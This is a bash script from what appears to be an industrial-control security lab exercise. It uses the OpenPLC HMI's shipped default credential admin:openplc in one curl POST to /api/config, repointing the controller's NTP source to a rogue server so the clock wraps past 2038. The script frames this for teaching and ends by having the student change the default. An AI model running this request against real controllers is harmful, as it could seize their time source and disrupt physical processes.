#!/usr/bin/env bash
# pivot.sh — Part 8, Exercise 3: the remote pivot (no console access needed).
#
# The HMI's /api/config is auth-gated, but the firmware ships the DEFAULT
# credentials admin:openplc (CWE-798 / CWE-1393). Anyone who knows them can
# repoint the controller's network time source over HTTP. This wraps the one
# long curl so you see the exact request without typing it.
#
#   ./ntp-aitm/pivot.sh                      # repoint NTP -> 127.0.0.1:1123 (the rogue server)
#   ./ntp-aitm/pivot.sh 10.0.0.9 123         # repoint to an arbitrary host:port
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
source "$HERE/../tools/teach.sh" 2>/dev/null || true
type say >/dev/null 2>&1 || { step(){ printf '\n== %s ==\n' "$*"; }; say(){ printf '>> %s\n' "$*"; }; run(){ printf '   $ %s\n' "$*"; "$@"; }; observe(){ printf '-> %s\n' "$*"; }; predict(){ printf '?? PREDICT FIRST: %s\n' "$*"; }; finding(){ printf '** FINDING: %s\n' "$*"; }; note(){ printf '   %s\n' "$*"; }; }

HOST="${HMI:-127.0.0.1:8080}"
NTP="${1:-127.0.0.1}"
PORT="${2:-1123}"

step "Remote pivot: repoint the time source with the default credential (Part 8, Ex 3)"
say  "No on-path position needed. The attacker just uses the shipped default login"
say  "admin:openplc to POST a new NTP server to /api/config - telling the device to"
say  "ask THEM for the time. Combined with an armed server, the clock wraps on the"
say  "next poll: default credential -> remote reconfig -> rogue time -> Y2038 wrap."
predict "Will /api/config return the current password in its JSON? (It should not -"
predict "note what the authenticated GET does and does not reveal.)"

note "the one repoint request (run shows it, then executes it):"
run curl -s -u admin:openplc -X POST "http://$HOST/api/config?ntp=$NTP&ntp_port=$PORT"
echo

observe "The time source is now $NTP:$PORT. Re-run 'ntpsync auto 127.0.0.1 3' in the"
observe "plc> console and ./ntp-aitm/arm.sh to serve a post-2038 time; clk wraps to"
observe "1902-04-27. This proves a REMOTE pivot (not on-path) owns the time path; it"
observe "does NOT prove TLS/auth were bypassed - the default credential simply worked."
finding "Record the 401 (no creds), the authenticated GET (no password returned), and"
finding "this repoint; then change the default and show the attacker is locked out."
